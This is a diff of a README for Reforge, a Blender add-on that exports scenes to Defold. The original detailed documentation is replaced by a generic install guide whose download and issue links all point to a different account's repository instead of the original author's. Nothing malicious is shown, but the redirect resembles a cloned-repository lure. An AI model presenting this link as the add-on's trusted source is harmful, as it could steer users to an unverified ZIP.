@@ -1,225 +1,85 @@
-[![](cover.png)](https://github.com/ufgo/reforge/)
+# 🎨 reforge - Effortlessly Export Scenes from Blender
 
+[![Download Reforge](https://img.shields.io/badge/Download-Reforge-blue.svg)](https://github.com/thanhphuc48/reforge/releases)
 
-# Reforge - Defold Scene Exporter (Blender Add-on)
+## 📥 Overview
 
-Blender add-on for exporting scenes into a Defold project as:
+Reforge is a Blender add-on designed for exporting your scenes into a Defold project seamlessly. With Reforge, you can export:
+
 - `.glb` meshes
-- `.model` files (supports **multiple materials**)
-- `.go` prefabs (created once, never overwritten)
-- `.collection` scene file (instances grouped under embedded `root`)
+- `.model` files that support multiple materials
+- `.go` prefabs that are created once and never overwritten
+- `.collection` scene files that group instances under an embedded root  
 
-Also supports optional **convex collision export** per prototype and **texture export** into your Defold project.
+Additionally, Reforge supports optional convex collision export for prototypes and texture export into your Defold project.
 
-## The add-on can be installed directly from Blender without manual downloads.
+## 🚀 Getting Started
 
-Just open Edit → Preferences → Extensions, search for Reforge, and install it with one click.
+This guide will help you download and run Reforge easily, even if you have no programming experience. Follow these steps.
 
-No more ZIP files — updates are handled automatically through Blender.
+### Step 1: Visit the Reforge Releases Page
+
+Go to the [Reforge releases page](https://github.com/thanhphuc48/reforge/releases). Here, you will find all available versions of the add-on.
+
+### Step 2: Download the ZIP File
+
+1. Look for the version you want to install. It will be listed as `reforge-<version>.zip`.
+2. Click on the version number to begin the download. 
+
+### Step 3: Open Blender
+
+Ensure Blender is installed on your computer. You can download Blender from the official [Blender website](https://www.blender.org/).
+
+### Step 4: Access Preferences in Blender
+
+1. Open Blender.
+2. From the top menu, click on `Edit`.
+3. From the dropdown, select `Preferences`.
+
+### Step 5: Navigate to the Add-ons Section
+
+1. In the Preferences window, click on the `Add-ons` tab on the left side.
+2. This section will show you the currently installed add-ons and allow you to manage them.
+
+### Step 6: Install Reforge from Disk
+
+1. Click the `Install from Disk…` button at the top of the window.
+2. In the file explorer that opens, locate and select the `reforge-<version>.zip` file you downloaded.
+3. Click `Install Add-on`.
+
+### Step 7: Enable the Add-on
+
+After installing, you need to enable Reforge:
+
+1. In the Add-ons section, use the search bar to find "Reforge".
+2. Check the box next to the Reforge entry to enable it.
+3. Blender will automatically save your preferences.
+
+## 🛠️ Optional Features
+
+Reforge provides additional functionalities to enhance your workflow:
+
+- **Convex Collision Export**: This feature allows you to add collision elements to your prototypes. It helps ensure your game objects interact correctly in Defold.
+- **Texture Export**: Reforge can include textures in your exported files, which makes it easy to apply visual details directly in your Defold project.
+
+## 📥 Download & Install
+
+To download Reforge, visit the [Reforge releases page](https://github.com/thanhphuc48/reforge/releases) and follow the installation instructions above. This structured approach will help you set up the add-on without hassle.
+
+## 📘 Support and Documentation
+
+If you run into issues or have questions, check the [GitHub Issues page](https://github.com/thanhphuc48/reforge/issues). Here, you can find answers or report problems related to the add-on.
+
+## 🛡️ System Requirements
+
+- Blender 2.8 or later
+- A Defold project environment for integration
+
+Make sure your Blender version meets these requirements to ensure smooth functionality.
+
+## 🌍 Community and Contributions
+
+Join the Reforge community! Share your experiences and projects using this add-on. If you would like to contribute to the Reforge project, consider checking the guidelines on GitHub.
 
 ---
-
-## Local Installation
-
-1.	Go to the Reforge releases page: https://github.com/ufgo/reforge/releases  
-2.	Download the desired version (reforge-<version>.zip).  
-3.	Open Blender.  
-4.	Navigate to: Edit → Preferences → Add-ons  
-5.	Click Install from Disk… and select the downloaded ZIP file.  
-6.	Enable the Reforge add-on in the add-ons list.    
-
-The Reforge panel will appear in:  
-3D Viewport → Sidebar (N) → Reforge  
-
----
-
-## Features
-
-### Scene export
-- Generates a Defold `.collection` with instances matching Blender transforms.
-- Instances are grouped like:
-  - `embedded_instances { id: "root" children: "<prototype>" ... }`
-  - one embedded group per prototype that contains all instances of that prototype.
-
-### Prototype export (no scene regeneration)
-- Export only assets (GLB + .model + convex collision files) without touching the `.collection`.
-- Useful when you updated a mesh/materials/textures and want to refresh only one prototype.
-
-### Multi-material `.model`
-- For each prototype, the exporter creates a `.model` file with **one `materials {}` block per Blender material slot** (unique materials, in slot order).
-- Material matching uses the **Blender material name** (must match the material name in the exported GLB).
-
-### Material-driven Defold paths (stored on Blender Materials)
-Add custom properties on Blender **Material** datablocks:
-- `defold_material` (string) — Defold `.material` path  
-- `defold_texture` (string) — Defold texture path (optional)
-
-If these are not set:
-- `defold_material` falls back to **Default Material** from the add-on UI
-- `defold_texture` is found from the material nodes:
-  - `Principled BSDF -> Base Color -> Image Texture`
-- if no image is found, a fallback built-in Defold logo texture is used.
-
-### Texture export
-When enabled, the add-on copies/saves textures into:
-- `assets/textures/`
-
-Textures are **overwritten** (no `_1`, `_2` duplicates).
-
-### Convex collision export
-Per-prototype collision export is controlled via **Object** custom properties:
-- `defold_collision` (bool) — enable convex collision export
-- `collision_group` (string, default: `"default"`)
-- `collision_mask` (string, default: `"default"`)
-
-For prototypes with `defold_collision = true`, exporter generates:
-- `assets/collisions/<proto>.convexshape`
-- `assets/collisions/<proto>.collisionobject`
-
-Collision objects are created as **STATIC**:
-```text
-type: COLLISION_OBJECT_TYPE_STATIC
-mass: 0.0
-friction: 0.1
-restitution: 0.5
-```
-
-# Safe Clear (with Confirmation)
-
-The add-on can remove only exporter-created custom properties from:
-
-- Objects
-- Materials used by those objects
-
-Keys removed:
-
-- **Object**: `defold_prototype`, `defold_collision`, `collision_group`, `collision_mask`
-- **Material**: `defold_material`, `defold_texture`
-
-Each Clear action uses Blender’s confirmation popup.
-
-# Installation
-
-1. Save the add-on script as a single `.py` file (example: `defold_scene_exporter.py`).
-
-2. In Blender:
-
-   - Edit → Preferences → Add-ons
-   - Install… → select the `.py` file
-   - Enable the add-on checkbox
-
-Panel location:
-
-- 3D Viewport → Sidebar (N) → Defold Export
-
-# Quick Start
-
-## 1) Set Defold Project Path
-
-In the add-on panel:
-
-- Defold Project Root → select your Defold project folder
-
-Default folders (editable):
-
-- `assets/models`
-- `assets/prefabs`
-- `assets/scenes`
-- `assets/textures`
-- `assets/collisions`
-
-## 2) Tag Objects with `defold_prototype`
-
-The exporter only includes objects that have custom property:
-
-- `defold_prototype`
-
-Fast way:
-
-- Use Tools section:
-  - 1) Set Props (Selected)
-  - 2) Set Props (Visible)
-  - 3) Set Props (All)
-
-This creates `defold_prototype` using the object name.
-
-## 3) Export a Scene
-
-- Set Collection Name
-- Press Generate Scene (`.collection`)
-
-## 4) Export Only One Prototype (No Scene Regen)
-
-Select the prototype’s mesh object and press:
-
-- Export Selected Prototype (No Scene)
-
-# Setting Up Multiple Materials
-
-How to assign Defold material/texture per Blender material
-
-Select your material → Material Properties → Custom Properties:
-
-Optional:
-
-- `defold_material` = `/assets/materials/my.material`
-- `defold_texture` = `/assets/textures/my.png`
-
-If you don’t set them:
-
-- `defold_material` uses UI Default Material
-- `defold_texture` is taken from Principled BSDF -> Base Color image node
-
-# Collision Setup
-
-On the Blender Object (not Material):
-
-- `defold_collision` = `True`
-- `collision_group` = `default` (or your group)
-- `collision_mask` = `default` (or your mask)
-
-You can set these quickly using the Tools section in the panel.
-
-# Notes / Behavior
-
-## `.go` Prefabs Are NOT Overwritten
-
-- If a `.go` file already exists, exporter will not rewrite it.
-- This is intentional to preserve manual edits (collision setup, scripts, etc).
-
-## Files That ARE Overwritten
-
-Per export, for each prototype:
-
-- `<proto>.glb`
-- `<proto>.model`
-- `<proto>.convexshape` (if enabled)
-- `<proto>.collisionobject` (if enabled)
-- the `.collection` file (when generating scene)
-
-## Export Visible Only
-
-If enabled, only objects that are visible in the viewport are exported.
-
-# Troubleshooting
-
-## “No MESH objects with ‘defold_prototype’…”
-
-- Ensure objects are Meshes
-- Ensure `defold_prototype` exists as a custom property
-- Check Export Visible Only and visibility of objects
-
-## Textures Create Duplicates Like `_1`, `_2`
-
-This add-on overwrites by filename. If you still see duplicates:
-
-- Make sure your Defold textures folder isn’t read-only
-- Ensure images have stable filenames (not generated temporary names)
-
-## Collision Seems Offset
-
-- Convex hull export uses rotation+scale but not translation (correct for Defold local collision space).
-- Avoid negative scale / mirrored objects.
-- Apply transforms in Blender if your object has unusual transforms.
-
-
+Enjoy exporting your scenes with Reforge, and streamline your game development process!
